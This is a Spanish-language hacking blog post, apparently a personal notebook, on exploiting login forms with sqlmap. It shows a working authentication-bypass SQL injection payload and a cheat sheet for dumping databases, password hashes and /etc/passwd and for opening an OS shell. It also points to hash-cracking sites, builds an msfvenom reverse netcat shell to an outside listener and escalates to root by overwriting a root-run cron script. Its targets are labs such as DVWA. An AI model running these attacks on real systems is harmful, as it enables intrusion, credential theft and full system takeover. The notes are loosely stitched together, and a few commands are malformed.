---
title: "Ataques de SQL Injection en formularios con Sqlmap"
date: 2024-08-05T00:49:00-03:00
tags: ['hacking','sqlmap']
---

```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev


```

Podemos ver que se está realizando una solicitud POST a este punto final:
```
python3 sqlmap.py -u 'http://localhost:3000/rest/user/login' --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B
```

* `-u` es la opción que nos permite dictar a qué punto final queremos que sqlmap apunte

* `--data` es la opción utilizada para especificar nuestro formato de datos POST separados por el separador &

* `--level 5` y `--risk 3` son opciones que determinan los tipos de payloads y técnicas que utiliza sqlmap contra el objetivo. Cuanto más alto sea el nivel, más solicitudes y pruebas más detalladas obtendrás. Esto tiene pros y contras, y puedes consultar mis hojas de trucos para obtener más información al respecto.

* `-f` y `--banner` son opciones de toma de huellas digitales que se utilizan para enumerar nuestro objetivo e intentar recopilar datos útiles.

* `--ignore-code 401` se usa porque cuando sqlmap envía solicitudes con payloads de sqli al destino, inevitablemente usará credenciales no válidas, lo que resultará en una respuesta HTTP 401 (401 no está autorizado) de la aplicación de destino... el problema es que sqlmap dejará de enviar solicitudes a la primera señal de respuestas 401 a menos que proporcionemos este indicador. Ya sabemos que las solicitudes resultarán en 401, por lo que no nos importa y queremos ignorarlas.

* `--dbms='sqlite'` si ya sabe sin lugar a dudas que su aplicación de destino está usando un determinado sistema de administración de bases de datos, como sabemos aquí que la tienda de jugos usa sqlite (generalmente puede resolver esto con un poco de investigación inicial) podemos especificarlo, lo que ayudará a sqlmap a reducir la cantidad de solicitudes que debe enviar y acelerará nuestras pruebas. Si no sabe qué es el DBMS back-end, puede omitir esto y sqlmap lo resolverá.

* `--technique=B` es decirle a sqlmap que solo use payloads ciegas basadas en booleanos para realizar pruebas en lugar de incluir todas sus otras técnicas. La única razón por la que hago esto es para acelerar las cosas, ya que sé que esta aplicación es susceptible a esta técnica. De lo contrario, puede dejar que sqlmap use todas sus técnicas disponibles para aumentar sus probabilidades de encontrar algo.

### El payload SQLi exitoso

Una cosa más que haré antes de terminar es observar el payload SQLi exitoso que encontró sqlmap:

```
Parameter: email (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: email=test@test.com' OR NOT 1120=1120-- BGqV&password=test
```

El parámetro vulnerable es el parámetro de correo electrónico, el tipo de inyección exitosa es `OR boolean-based blind` y el payload es el siguiente:

```
' OR NOT 1120=1120-- BGqV
```

Lo interesante de esto es que técnicamente este payload no funciona, pero hay una razón por la que sqlmap se la muestra. Déjame demostrarlo.
Podemos probar este payload manualmente a través de la página web y mediante ZAP.
En la página de inicio de sesión, si intentamos enviar esto como nombre de usuario:

`test@test.com' OR NOT 1120=1120-- BGqV`
![login](/img/sql/login.webp)

No obtenemos un inicio de sesión exitoso. Entonces, ¿qué está pasando? ¿Por qué sqlmap dice que es un payload exitoso?

Hay una razón por la que te enseño cómo revisar el código base de sqlmap.

Si vamos a `/data/xml/payloads/boolean_blind.xml` en el código base de sqlmap y buscamos el título del payload (`OR boolean-based blind - WHERE or HAVING clause (NOT)`), veremos que este payload se compara con la respuesta del segundo payload:

```
<request>
     <payload>OR NOT [RANDNUM]=[RANDNUM]</payload>
</request>
<response>
     <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
</response>
```
![payload](/img/sql/payload.webp)

Lo que esto significa es que el primer payload - la que muestra sqlmap:

`' OR NOT 1120=1120-- tGvo`

En realidad, se está comparando con los resultados de este payload ligeramente modificado:

`' OR NOT 1120=-1120-- tGvo`

(Observe el número negativo en el segundo payload)

Debido a que sqlmap obtiene resultados diferentes de la aplicación/base de datos cuando compara estos dos resultados, sabe que los diferentes payloads desencadenan una respuesta diferente de la base de datos, lo que significa que es vulnerable a las inyecciones de SQL. No deberíamos poder manipular consultas SQL de la forma en que lo hace el payload si esta base de datos no es vulnerable a SQLi.

Entonces, nuestro payload exitosa es en realidad la de comparación, pero esa no es la que nos muestra sqlmap.

Si utilizamos ese payload de comparación, iniciaremos sesión correctamente a través de la aplicación.

Nuevamente, también podemos ejecutar esto a través de ZAP.

```
test@test.com' OR NOT 1120=-1120-- tGvo
```

Obtenemos un inicio de sesión exitoso a pesar de que estas no son credenciales válidas; es porque hemos encontrado un payload de inyección SQL exitoso que engaña a la base de datos haciéndole creer que somos un usuario válido.


![success](/img/sql/exito.webp)

######## Otro
```bash
--update
sqlmap -u "URL"
sqlmap -u "URL" --dbs
sqlmap -u "URL" -D database --tables
sqlmap -u "URL" -D database -T table --columns
sqlmap -u "URL" -D database -T table -C field1,field2 --dump
sqlmap -u "URL" -D database -T table --dump
sqlmap -u "URL" -D database --dump-all
# POST data
# json ，--data "{'a':1,'b':2}" 或者 --data '{"a":1,"b":2}'
--data "a=1&b=2"
--cookie "SESSION_ID=xxx;abc=xxx;"
--header "User-Agent: Mozilla/5.0 (Windows NT ..."
-p par1,par2
--skip par1,par2
# B = boolean-based
# E = error-based
# U = union-based
# S = stacked-queries
# T = time-based
# Q = inline-queries
--technique BEQU
--union-cols 5
# --union-values "1,*,3,4,5"
--union-values "1,*,3,4,5"
--prefix "'"
--suffix "-- a"
-v 3
--dbms mysql
--batch
--skip-waf
--risk N
--level N
--forms
-b
--dbs
-D "DB_Name"
--tables
-T "Table_Name"
--columns
-C "account,password"
-X "id,time"
--dump
--dump-all
--is-dba
--passwords
--current-db
--current-user
--file-read "/etc/passwd"
--file-write "/your/file/path"
--file-dest "/server/root/path"
--sql-shell
--os-shell
--web-root "/var/www/html/upload"
--text-only
--string "STR"
--skip-urlencode
--no-escape
--time-sec 10
--fresh-queries
--binary-fields column_name
--tamper space2comment,space2hash,space2mssqlhash

python sqlmap.py ... --test-skip='(MySQL > 5)|(MySQL >= 5)'
python sqlmap.py ... --test-skip='MySQL >=? 5'

```
https://hackmd.io/@bttea/sqlmap_common_parameters


## Otra
https://hackertarget.com/sqlmap-post-request-injection/   
#### Interesantes ataques con sqlmap:
https://blog.csdn.net/dzqxwzoe/article/details/132683722
https://www.cnblogs.com/insane-Mr-Li/p/10150165.html
https://www.cnblogs.com/Sylon/p/11747464.html
https://blog.csdn.net/Breeze_CAT/article/details/80628392
https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
#### cheatsheet
https://cdn.comparitech.com/wp-content/uploads/2021/07/sqlmap-Cheat-Sheet.pdf

https://www.binarytides.com/using-sqlmap-with-login-forms/
https://www.hackingarticles.in/exploiting-form-based-sql-injection-using-sqlmap/
https://www.cnblogs.com/insane-Mr-Li/p/10150165.html

https://old.reddit.com/r/hackthebox/comments/sato6n/sqlmap_forms/
```
sqlmap -u “http://example.com/“ --crawl=1 ---random-agent --batch --forms --threads=5 --level=5 --risk=3
```



# Otra forma

Usando Damn Vulnerable Web Application podemos intentar explotar un sql injection

Instalá docker: `sudo apt install -y docker.io` `sudo usermod -aG docker $USER` ahora tenés que desloguearte y volver a ingresar para formar parte del grupo docker.

`docker run --rm -it -p 1234:1234 vulnerables/web-dvwa`

```bash
http://192.168.136.131/sqlmap/mysql/get_int.php?id=1
```


1. Identifica los parámetros de prueba (en esta caso id)
2. Identifica las técnicas de SQL Injection a usar
3. Fingerprint el backend DBMS (recompila información). DBMS=mysql,mariadb, sqlite
4. Intenta explotar vulnerabilidades.

```
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=234&Submit=Submit#" --cookies "PHPSESSID=123; security=low" --tables

sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=234&Submit=Submit#" --cookies "PHPSESSID=123; security=low" --schema

sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=234&Submit=Submit#" --cookies "PHPSESSID=123; security=low" --schema --batch

sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=234&Submit=Submit#" --cookies "PHPSESSID=123; security=low" --columns -T users --batch

sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=234&Submit=Submit#" --cookies "PHPSESSID=123; security=low" --dump -T users --batch

sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=234&Submit=Submit#" --cookies "PHPSESSID=123; security=low" --passwords
```

### SQLMAP en Formularios
```
sqlmap -u http://127.0.0.1/login.php --form --dbs --batch
available databases[2]:
admin
information_schema

sqlmap -u http://127.0.0.1/login.php --form -D admin --dump-all --batch
```

https://crackstation.net   
https://hashkiller.io `-> hash cracker`   
https://hashes.com/en/decrypt/hash   



o googleá: md5 decrypt


## Para conseguir un reverse shell una vez que tuvimos acceso con el usuario y contraseña obtenida en el paso anterior explotamos otra vulnerabilidad.
#### php regular expression pattern exploit
Para crear el payload.
Necesitamos codificarlo con burp suit -> decoder -> as url -> pega el payload y luego ponelo entre `system()`   
`sudo msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.0.201 LPORT=4545 -f raw`   
`sudo rlwrap nc -lvp 4545`
Ahora podemos ejecutar cualquier comando como `id`

#### Para conseguir el acceso a root al sistema:
```
cat /etc/crontab
cat /var/www/cronjobs/clearlogs
ls -la /var/www/cronjobs/
ls -la /var/www/cmd/
ls -la /var/www/
cd /var/www/cmd
```
Hacemos esto porque logcleared.sh es ejecutado por el usuario root.    
```
echo "payload obtenido con el comando msfvenom con el puerto cambiado" > logcleared.sh
chmod +x logcleared.sh
sudo rlwrap nc -lvp 4546
```

```
sqlmap -u "URL" --data="opcion=4&docnro=78979&clave=hola&olvido=0" --random-agent -f --banner --ignore-code 401 --dbms='mariadb' --technique=B
```


https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body

JSON data as body 


```bash
POST / HTTP/1.1
Host: www.example.com

{"username":"*", "password":"*"}
```

`sqlmap -r sqlrequest.txt --level=5 risk=3 --force-ssl`


```bash
--csrf-url 'https://studentportal.elfu.org/validator.php' --csrf-token="token"
```

También podés usar sqlmap en burpsuit está integrado ejecutando el siguiente comando:

```bash
└─$ sqlmapapi -s -H 127.0.0.1 -p 9090
```
